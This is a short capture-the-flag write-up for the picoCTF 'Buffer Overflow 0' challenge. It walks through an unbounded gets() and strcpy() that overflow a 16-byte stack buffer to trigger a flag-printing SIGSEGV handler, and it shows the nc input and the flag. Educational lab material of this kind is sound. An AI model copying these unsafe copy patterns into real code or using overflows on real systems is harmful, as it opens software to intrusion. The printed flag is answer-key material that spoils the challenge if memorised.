# BUFFER OVERFLOW 0

## OVERVIEW & IDEA

- This challenge gives us a binary file and its source code.

- By checking the source file, I found the `signal()` function, which is set up signal handler.


```
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```

- Below is details of `signal()`

```
DESCRIPTION

    The C library function void (*signal(int sig, void (*func)(int)))(int) sets a function to handle signal i.e. a signal handler with signal number sig.

    [...]

    SIGSEGV (Signal Segmentation Violation) Invalid access to storage − When a program tries to read or write outside the memory it is allocated for it.

PARAMETERS

    sig − This is the signal number to which a handling function is set. The following are few important standard signal numbers 

    func − This is a pointer to a function. This can be a function defined by the programmer or one of the following predefined functions

[...]
```

- So when the program get invalid access to storage, it will call `sigsegv_handler()` and this function just print flag for us.

```
void sigsegv_handler(int sig) {
    printf("%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

# DETAILS & EXPLOIT

- Program `gets(buf1)` in main

```
    char buf1[100];
    gets(buf1); 
    vuln(buf1);
```

- And in `vuln()`

```
void vuln(char *input){
    char buf2[16];
    strcpy(buf2, input);
}
```

- So when we input for `buf1` 24 characters `'a'`, it will overwrite the `ret` of `vuln()`. After that, the program will return to wrong address. Then the `sigsegv_handler()` will be called and we get the flag.

```
λ ~/ nc saturn.picoctf.net 51110
Input: aaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```